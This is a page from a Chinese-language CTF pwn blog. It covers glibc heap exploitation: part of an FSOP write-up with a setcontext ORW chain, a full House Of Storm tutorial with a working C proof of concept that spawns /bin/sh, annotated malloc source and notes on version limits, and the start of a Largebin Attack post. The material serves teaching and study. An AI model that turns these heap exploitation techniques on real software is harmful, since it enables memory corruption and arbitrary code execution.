<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55b7807e5960</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55b7807e5960</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55b7807e5968</span> ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55b7807e5970</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55b7807e5978</span> —▸ <span class="number">0x7f11a54eb510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55b7807e5980</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55b7807e5988</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55b7807e5990</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55b7807e5998</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55b7807e59a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55b7807e59e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55b7807e5a00</span> —▸ <span class="number">0x55b7807e5578</span> ◂— <span class="number">0x2</span> <span class="comment">// rdi+0xa0 </span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55b7807e5a08</span> —▸ <span class="number">0x7f11a5160738</span> (mblen+<span class="number">104</span>) ◂— pop    rax <span class="comment">// rdi+0xa8</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55b7807e5a10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55b7807e5a18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0x55b7807e5a20</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0x55b7807e5a38</span> —▸ <span class="number">0x55b7807e5550</span> ◂— <span class="number">0x0</span> <span class="comment">// fake vtable addr</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55b7807e5550</span> <span class="comment">// fake vtable addr</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55b7807e5550</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55b7807e5568</span> —▸ <span class="number">0x7f11a516db85</span> (setcontext+<span class="number">53</span>) ◂— mov    rsp, qword ptr [rdi + <span class="number">0xa0</span>] <span class="comment">// fake vtable -&gt; _IO_OVERFLOW</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55b7807e5570</span> —▸ <span class="number">0x7f11a5160738</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55b7807e5578</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55b7807e5580</span> —▸ <span class="number">0x7f11a5147112</span> (iconv+<span class="number">194</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55b7807e5588</span> —▸ <span class="number">0x55b7807e5c10</span> ◂— <span class="number">0x67616c662f2e</span> <span class="comment">/* &#x27;./flag&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55b7807e5590</span> —▸ <span class="number">0x7f11a51462f8</span> (init_cacheinfo+<span class="number">40</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55b7807e5598</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55b7807e55a0</span> —▸ <span class="number">0x7f11a5127b92</span> ◂— pop    rdx</span><br></pre></td></tr></table></figure>
<p>现在 <code>rsp</code> 将会指向 fake vtable -&gt; _IO_OVERFLOW（ORW的头部），之后就可以顺利读出 flag 了</p>
<hr>
<p><strong>小结</strong></p>
<p>这个题目花了我很长的时间，我也学习到了 FSOP，堆上ORW，甚至是 House Of Storm（虽然没有成功）</p>
<p>在进行 FSOP 时，我的堆布局前前后后被改了十几次，因为这是我第一次尝试 FSOP 没有什么经验，所以我所有的操作都是以 House Of Orange 为模板进行修改的，当时很苦恼，因为报错了也不知道原因，只能盲目的模仿，好在最后还是模仿出来了</p>
<p>进行FSOP攻击后，我可以执行libc中的函数，但就是执行不了我的ORW链，后来发现我把ORW链写在堆中，需要栈迁移来调整栈空间，最后在学长的帮助下我了解到了 setcontext 函数，分析其源码过后，成功利用它执行了ORW链</p>
<p>PS：其实最开始我以为这题需要用到 largebin attack 的知识（比如：House Of Storm），所以我也去学了一下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/House%20Of%20Storm-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/27/House%20Of%20Storm-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Storm-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-27 22:47:19" itemprop="dateCreated datePublished" datetime="2022-03-27T22:47:19+08:00">2022-03-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:40:59" itemprop="dateModified" datetime="2022-04-06T14:40:59+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Storm"><a href="#House-Of-Storm" class="headerlink" title="House Of Storm"></a>House Of Storm</h2><p>House Of Storm 是一种结合了 <code>unsortedbin attack</code> 和 <code>Largebin attack</code> 的攻击技术，其基本原理和 <code>Largebin attack</code> 类似 </p>
<p>House Of Storm 可以在任意地址写出chunk地址，进而把这个地址的高位当作size，可以进行任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大，但是其条件也是非常的苛刻</p>
<hr>
<h2 id="House-Of-Storm-利用姿势"><a href="#House-Of-Storm-利用姿势" class="headerlink" title="House Of Storm 利用姿势"></a>House Of Storm 利用姿势</h2><p>House Of Storm 利用条件：</p>
<ul>
<li>libc版本小于libc-2.30（因为libc-2.30之后加入了检查）</li>
<li>需要攻击者在 <code>largebin</code> 和 <code>unsortedbin</code> 中分别布置一个chunk，这两个chunk需要在归位之后处于同一个 <code>largebin</code> 的index中，且 <code>unsortedbin</code> 中的chunk要比 <code>largebin</code> 中的大</li>
<li>需要 <code>unsorted_bin</code> 中的 <code>bk指针</code> 可控</li>
<li>需要 <code>largebin</code> 中的 <code>bk指针和bk_nextsize</code> 指针可控 </li>
</ul>
<p>相较于 <code>Largebin attack</code> 来说，攻击需要的条件多出了一条 “unsorted bin中的bk指针可控” ，但是基本上程序如果 <code>Largebin attack</code> 条件满足，基本代表存在UAF漏洞，那么多控制一个bk指针应该也不是什么难事</p>
<p>House Of Storm 利用姿势：</p>
<ul>
<li>利用 large bin attack 分别错位写一个size和bk的地址，size错位写了0x56（由于pie的原因，chunk的地址总是为6字节，但是头部地址可能是0x55或者0x56，这里需要0x56才能成功，因为malloc后会进行检测）</li>
<li>以下检测需要满足的要求，只需满足一条即可：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line"><span class="comment">/* 1. victim 为 0 */</span></span><br><span class="line"><span class="comment">/* 2. IS_MMAPPED 为 1 */</span></span><br><span class="line"><span class="comment">/* 3. NON_MAIN_ARENA 为 0 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用 unsorted bin attack 在FD的位置写一个main_arena + 88的地址，从而绕过了检测</li>
</ul>
<p>House Of Storm 从根本上也是写堆地址，但是攻击者可以利用巧妙的构造 <strong>把这个堆地址伪造成size字段</strong> ，基于这个size字段，就可以展开 unsortedbin attack 了</p>
<p>伪造案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  presize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd_nextsize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_chunk = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line">	</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="keyword">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./test</span><br><span class="line">[<span class="number">1</span>]    <span class="number">5082</span> segmentation fault  ./test</span><br><span class="line">➜  桌面 ./test</span><br><span class="line">[<span class="number">1</span>]    <span class="number">5088</span> segmentation fault  ./test</span><br><span class="line">➜  桌面 ./test</span><br><span class="line">$ whoami</span><br><span class="line">yhellow</span><br></pre></td></tr></table></figure>
<p>接下来进行单步调试：</p>
<ul>
<li>基本操作执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a000</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x55555555a450</span> —▸ <span class="number">0x7ffff7dd1f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x55555555a450</span></span><br></pre></td></tr></table></figure>
<ul>
<li>看一下“unsorted_chunk”和“large_chunk”中的数据：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a000</span> <span class="comment">/* unsorted_chunk */</span></span><br><span class="line"><span class="number">0x55555555a000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x55555555a010</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span> <span class="comment">/* main_arena */</span></span><br><span class="line"><span class="number">0x55555555a020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a450</span> <span class="comment">/* large_chunk */</span></span><br><span class="line"><span class="number">0x55555555a450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x55555555a460</span>:	<span class="number">0x00007ffff7dd1f68</span>	<span class="number">0x00007ffff7dd1f68</span> <span class="comment">/* main_arena */</span></span><br><span class="line"><span class="number">0x55555555a470</span>:	<span class="number">0x000055555555a450</span>	<span class="number">0x000055555555a450</span> <span class="comment">/* large_chunk(指向自身) */</span></span><br><span class="line"><span class="number">0x55555555a480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改完成后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a000</span> <span class="comment">/* unsorted_chunk */</span></span><br><span class="line"><span class="number">0x55555555a000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x55555555a010</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x0000555555558040</span> <span class="comment">/* fake_chunk */</span></span><br><span class="line"><span class="number">0x55555555a020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a450</span> <span class="comment">/* large_chunk */</span></span><br><span class="line"><span class="number">0x55555555a450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x55555555a460</span>:	<span class="number">0x00007ffff7dd1f68</span>	<span class="number">0x0000555555558048</span> <span class="comment">/* fake_chunk+8 */</span></span><br><span class="line"><span class="number">0x55555555a470</span>:	<span class="number">0x000055555555a450</span>	<span class="number">0x0000555555558023</span> <span class="comment">/* fake_chunk-0x18-5 */</span></span><br><span class="line"><span class="number">0x55555555a480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">/* GDB显示出错了 */</span></span><br><span class="line">FD: <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a000</span></span><br><span class="line">BK: <span class="number">0x55555555a000</span> —▸ <span class="number">0x555555558040</span> (chunk) ◂— <span class="number">0x0</span> <span class="comment">/* fake_chunk */</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555a450</span> —▸ <span class="number">0x7ffff7dd1f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x55555555a450</span></span><br><span class="line">BK: <span class="number">0x55555555a450</span> —▸ <span class="number">0x555555558048</span> (chunk+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现 fake_chunk 被链入 unsortedbin ，而且是第一个</li>
<li>正常申请是肯定会报错的，因为程序从 unsortedbin 中申请 fake_chunk 时通不过检查</li>
</ul>
<p>但是程序却可能不报错，为什么会这样呢？这一点需要在源码中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fwd =&gt; 最终为victim的上一个chunk(其实就是largebin chunk)*/</span></span><br><span class="line"><span class="comment">/* bck =&gt; 最终为victim的下一个chunk */</span></span><br><span class="line"><span class="comment">/* victim =&gt; 即将进入largebin的unsortedbin chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fwd-&gt;bk =&gt; fake_chunk+8 */</span></span><br><span class="line"><span class="comment">/* fwd-&gt;bk_nextsize =&gt; fake_chunk-0x18-5 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* victim将成为新的纵向链表头 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     <span class="comment">/* unsorted_bin-&gt;fd_nextsize=large_bin */</span></span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;bk_nextsize=fake_chunk-0x18-5 */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    <span class="comment">/* (fake_chunk-0x18-5)=unsorted_bin */</span></span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    <span class="comment">/* (fake_chunk-0x18-5)+0x18=victim */</span></span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">	<span class="comment">/* bck=fake_chunk+8 */</span></span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    mark_bin (av, victim_index);</span><br><span class="line"></span><br><span class="line">    victim-&gt;bk=bck;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;bk=fake_chunk+8 */</span></span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;fd=large_bin */</span></span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    <span class="comment">/* fake_chunk+8=victim */</span></span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">	<span class="comment">/* (fake_chunk+8)-8=victim */</span></span><br></pre></td></tr></table></figure>
<p>其实这就是 largebin attack 的作用了，最关键的一步是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">/* (fake_chunk-0x18-5)+0x18=victim */</span></span><br></pre></td></tr></table></figure>
<p>其实就是在 fake_chunk-5 中写入了 victim</p>
<ul>
<li>如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，减去5个字节，剩下的就是0x55（或0x56）了</li>
<li>如果提前5个字节开始写堆地址，那么伪造在 <code>size字段</code> 上面的就正好是0x55</li>
</ul>
<p>也就是说，链入 unsortedbin 的 fake_chunk 的 <code>size字段</code> 是可能为0x56的，而0x56刚好可以通过 unsortedbin 的检查（注意：<code>size字段</code> 如果为“0x55”，那么P位就是“1”，通不过检查）</p>
<p>接下来程序就会申请到 fake_chunk ，然后在其中写入“/bin/sh”，作为system的参数</p>
<h2 id="版本对-House-Of-Storm-的影响"><a href="#版本对-House-Of-Storm-的影响" class="headerlink" title="版本对 House Of Storm 的影响"></a>版本对 House Of Storm 的影响</h2><p><strong>libc-2.30</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>有点类似于 unlink 的检查（检查目标chunk的上一个chunk的下一个chunk，是不是目标chunk）</p>
<p>由于 House Of Storm 会修改 fwd-&gt;bk_nextsize ，所以检查不通过，导致 House Of Storm 失效</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/" class="post-title-link" itemprop="url">Ptmalloc算法：Largebin Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-27 11:26:02" itemprop="dateCreated datePublished" datetime="2022-03-27T11:26:02+08:00">2022-03-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-28 12:30:37" itemprop="dateModified" datetime="2022-04-28T12:30:37+08:00">2022-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：Largebin-Attack"><a href="#Ptmalloc算法：Largebin-Attack" class="headerlink" title="Ptmalloc算法：Largebin Attack"></a>Ptmalloc算法：Largebin Attack</h2><p>Large Bin Attack 是一种较为困难的攻击方式，他对攻击的条件要求较多，实现也较为复杂，通常和 Unsorted Bin 打配合来实现 house of storm，来达到提升影响力的作用</p>
<ul>
<li>libc-2.29 及以下版本，可以利用 Large Bin Attack 来写两个地址</li>
<li>libc-2.30 及以上版本中，只能利用 Large Bin Attack 来写一个地址</li>
</ul>
